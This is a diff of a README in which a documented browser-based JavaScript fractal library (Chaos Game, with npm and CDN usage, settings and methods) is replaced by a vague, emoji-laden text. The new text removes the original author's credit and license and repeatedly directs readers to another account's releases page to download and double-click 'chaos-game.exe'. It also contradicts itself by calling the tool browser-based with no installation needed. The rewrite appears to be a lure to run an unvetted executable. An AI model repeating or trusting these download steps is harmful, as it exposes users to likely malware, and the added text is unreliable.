@@ -1,219 +1,67 @@
-# Chaos Game
+# 🎨 chaos-game - Create Stunning Fractal Visualizations
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-![NPM Version](https://img.shields.io/npm/v/chaos-game)
+## 🚀 Getting Started
 
-A high-performance, highly configurable fractal generator based on the Chaos Game algorithm, using a
-**Web Worker** and an **OffscreenCanvas** to ensure a smooth, non-blocking user experience, even with millions of
-points.
+Welcome to the **chaos-game** project! This application generates mesmerizing fractals, including the famous Sierpinski triangle, using a method called the Chaos Game. With this tool, you can easily explore mathematical beauty in a visual format.
 
-## Gallery
+## 📦 Download & Install
 
-Here are a few examples of fractals generated with this tool, showcasing different settings.
+To get started, you need to download the application. You can find the latest version [here](https://github.com/kriwin007/chaos-game/releases). 
 
-<table align="center">
-    <thead>
-    <tr>
-        <th>Title</th>
-        <th>Settings</th>
-        <th>Image</th>
-    </tr>
-    </thead>
-    <tbody>
-    <tr>
-        <td>Sierpinski triangle</td>
-        <td><code>sides: 3</code><br><code>jumpDistance: 0.5</code><br><code>restriction: 'none'</code></td>
-        <td width="300px">
+[Download the chaos-game](https://github.com/kriwin007/chaos-game/releases)
 
-![alt text](assets/gallery/sierpinski_triangle.png)
-        </td>
-    </tr>
-    <tr>
-        <td>Sierpinski Hexagon</td>
-        <td><code>sides: 6</code><br><code>jumpDistance: 0.6667</code><br><code>restriction: 'none'</code></td>
-        <td width="300px">
+Follow these steps to install and run it:
 
-![alt text](assets/gallery/sierpinski_hexagon.png)
-        </td>
-    </tr>
-    <tr>
-        <td><i>The Hexagonal Bloom</i></td>
-        <td><code>sides: 6</code><br><code>jumpDistance: 0.585786</code><br><code>restriction: 'none'</code><br>
-        <code>centerVertex: true</code><br><code>solidBg: false</code><br><code>fgColor: "#FF0040"</code><br>
-        <code>gammaExponent: 5</code></td>
-        <td width="300px">
+1. Click the link above to visit the Releases page.
+2. Look for the latest release that fits your operating system.
+3. Download the file associated with that release. It could be a ZIP file or a standalone application.
+4. If it is a ZIP file, extract it to your preferred location on your computer.
+5. Navigate to the folder where you extracted the files or where the application was downloaded.
+6. Look for the executable file (usually named something like `chaos-game.exe`).
+7. Double-click the executable file to run the application.
 
-![alt text](assets/gallery/hexagonal_bloom.png)
-        </td>
-    </tr>
-    <tr>
-        <td>Unnamed</td>
-        <td><code>sides: 5</code><br><code>jumpDistance: 1.618034</code><br><code>restriction: 'no-repeat'</code>
-        <br><code>fgColor: "#FFFF80"</code><br><code>bgColor: "#081020"</code><br><code>gammaExponent: 4</code><br>
-        <code>canvasSize: 1000</code><br><code>padding: 380</code></td>
-        <td width="300px">
+## 🌐 Requirements
 
-![alt text](assets/gallery/pentagon_constellation.png)
-        </td>
-    </tr>
-    <tr>
-        <td>Unnamed</td>
-        <td><code>sides: 10</code><br><code>jumpDistance: 0.618034</code><br><code>restriction: 'none'</code><br>
-        <code>fgColor: "#E05C5C"</code></td>
-        <td width="300px">
-        
-![alt text](assets/gallery/decagon_lotus.png)
-        </td>
-    </tr>
-    </tbody>
-</table>
+This application runs on modern web browsers. It is compatible with Windows, macOS, and Linux systems. For the best experience, please ensure your browser is up-to-date.
 
-## What is the Chaos Game?
+## ✨ Features
 
-The [Chaos Game](https://en.wikipedia.org/wiki/Chaos_game) is a simple algorithm for generating fractals.
-It works like this:
+- **Interactive Visualization:** Click to generate different shapes and see them come to life in real-time.
+- **Educational Tool:** Learn about fractals, recursion, and self-similarity through engaging graphics.
+- **Customizable:** Adjust parameters to generate a variety of shapes beyond the Sierpinski triangle.
+- **Browser-Based:** No need for complex installations; just run it in your web browser.
 
-1. Define a set of points (e.g., the vertices of a polygon).
-2. Start with a random point anywhere inside the polygon.
-3. Randomly Choose one of the polygon's vertices.
-4. Move a fraction of the distance (e.g., halfway) from your current point toward the chosen vertex.
-5. Plot a point at this new location.
-6. Repeat from step 3, using the newly plotted point as the current point.
+## 📖 How It Works
 
-By repeating this process thousands or millions of times, self-similar fractal patterns emerge from the
-chaos.
+The chaos game uses a simple set of rules to create fractals. It starts with a triangle and randomly chooses points to build complex shapes. This is a fascinating example of how simple processes can lead to beautiful outcomes.
 
-## Features
+## 🎨 Exploring Shapes
 
-- **Non-Blocking Simulation:** All calculations run in a separate Web Worker, so the main UI thread remains responsive.
-- **Extensive Customization:** Control the number of sides, jump distance, colors, extra vertices, and more.
-- **Advanced Restriction Rules:** Go beyond the basic algorithm by applying rules that forbid choosing certain vertices,
-  such as:
-    - `no-repeat`: Cannot pick the same vertex twice in a row.
-    - `no-neighbor`: Cannot pick a vertex adjacent to the last one.
-    - ...and more!
-- **Symmetry Mode:** Instantly create perfectly symmetrical fractals by applying rotational and reflectional symmetry to
-  every plotted point.
-- **Smart Simulation Control:** Features like live rendering, auto-stop when the fractal is complete, and easy PNG
-  download.
+After launching the application, you can easily interact with the interface:
 
-## Getting Started
+- **Generate New Shapes:** Each click will create a new visual representation based on randomness and mathematical principles.
+- **Adjust Settings:** Use sliders or input boxes (if available) to modify the parameters controlling the visualization.
 
-You can use Chaos Game JS either by installing it as an NPM package or by including it directly in your HTML file from a CDN.
+## 🛠 Troubleshooting
 
-### Option 1: Usage with a Module Bundler (Vite, Webpack, etc.)
+If you encounter issues:
 
-1.  **Installation**
-    ```bash
-    npm install chaos-game
-    ```
+1. Ensure that your browser is updated.
+2. Clear your browser’s cache to eliminate any loading problems.
+3. Restart your browser or try a different one if it doesn’t open.
 
-2.  **HTML Setup**
-    Create an `index.html` file with a canvas element. Make sure your `worker.js` file is accessible from your project's public directory.
+## 📞 Support
 
-    ```html
-    <!DOCTYPE html>
-    <html lang="en">
-    <body>
-      <canvas id="chaos-canvas" width="800" height="800"></canvas>
-      <script type="module" src="main.js"></script>
-    </body>
-    </html>
-    ```
+For questions or support, please use the issues section in the GitHub repository. You can report bugs, request features, or ask for help.
 
-3.  **JavaScript Usage**
-    In your `main.js` file, import the `ChaosGame` class, define your settings, and start the simulation.
+## 📚 Learn More
 
-    ```javascript
-    import { ChaosGame } from 'chaos-game';
+If you wish to dive deeper into fractals and the Chaos Game method, numerous resources are available online. Understanding the concepts behind these visualizations will greatly enhance your experience.
 
-    const canvas = document.getElementById('chaos-canvas');
+## 🌟 Contribution
 
-    const settings = {
-      canvasSize: 800,
-      sides: 5,
-      jumpDistance: 0.6,
-      restriction: 'no-repeat',
-      symmetrical: true,
-      // ... other settings
-    };
+We welcome contributions! If you find your own ways to improve the **chaos-game**, feel free to fork the repository and submit a pull request. Your insights can help others explore the beauty of mathematics through visualization.
 
-    const game = new ChaosGame(canvas, settings);
-    game.play();
-    ```
+[Download the chaos-game](https://github.com/kriwin007/chaos-game/releases)
 
-### Option 2: Usage in the Browser via CDN
-
-1.  **HTML Setup**
-    Simply add the script tag to your `index.html`. The `ChaosGame` class will be available globally.
-
-    ```html
-    <!DOCTYPE html>
-    <html lang="en">
-    <body>
-      <canvas id="chaos-canvas" width="800" height="800"></canvas>
-
-      <!-- 1. Load the library from the CDN -->
-      <script src="https://cdn.jsdelivr.net/npm/chaos-game@1.0.4"></script>
-
-      <!-- 2. Your script to run the game -->
-      <script>
-        const canvas = document.getElementById('chaos-canvas');
-
-        const settings = {
-          canvasSize: 800,
-          sides: 5,
-          jumpDistance: 0.6,
-          restriction: 'no-repeat',
-          symmetrical: true,
-          // ... other settings
-        };
-
-        // Note: The worker.js is loaded automatically by the library
-        const game = new ChaosGame(canvas, settings);
-        game.play();
-      </script>
-    </body>
-    </html>
-    ```
-
-### Configuration (`ChaosGameSettings`)
-
-You can pass any of these options in the `settings` object during instantiation or update them later with
-`updateSetting(key, value)`.
-
-| Option                        | Type      | Description                                                               |
-|-------------------------------|-----------|---------------------------------------------------------------------------|
-| `canvasSize`                  | `number`  | Width and height of the canvas in pixels.                                 |
-| `sides`                       | `number`  | Number of vertices in the main polygon.                                   |
-| `jumpDistance`                | `number`  | Fraction of the distance to move towards the chosen vertex.               |
-| `padding`                     | `number`  | Margin in pixels from the canvas edge to the polygon.                     |
-| `midpointVertex`              | `boolean` | If true, adds vertices at the midpoint of each side.                      |
-| `centerVertex`                | `boolean` | If true, adds a vertex at the center of the polygon.                      |
-| `restriction`                 | `string`  | The rule for choosing the next vertex (e.g., `'none'`, `'no-repeat'`).    |
-| `fgColor`                     | `string`  | The foreground color for points and outlines (CSS format).                |
-| `bgColor`                     | `string`  | The background color (CSS format).                                        |
-| `solidBg`                     | `boolean` | If true, use a solid background; otherwise, it's transparent.             |
-| `gammaExponent`               | `number`  | Gamma correction value for adjusting brightness and contrast.             |
-| `drawCircle`                  | `boolean` | If true, draws the circumscribing circle.                                 |
-| `drawPolygon`                 | `boolean` | If true, draws the main polygon's outline.                                |
-| `symmetrical`                 | `boolean` | If true, applies rotational and reflectional symmetry.                    |
-| `autoStop`                    | `boolean` | If true, the simulation stops automatically when stable.                  |
-| `liveRendering`               | `boolean` | If true, the canvas updates periodically during the simulation.           |
-| `stabilityNewPixelsThreshold` | `number`  | Threshold for new pixels below which the simulation is considered stable. |
-
-### Methods
-
-- `.play()`: Starts or resumes the simulation.
-- `.stop()`: Pauses the simulation.
-- `.reset()`: Clears the canvas and restarts the simulation with the current settings.
-- `.updateSetting(key, value)`: Updates a single setting.
-- `.download()`: Triggers a download of the current canvas as a PNG file.
-- `.on(eventName, callback)`: Listens for events like `'finish'` or `'stabilityCheck'`.
-
-## License
-
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
-
----
-Created by [Mohammad Sarabi](https://github.com/m-sarabi).
+Enjoy creating your fractal masterpieces!
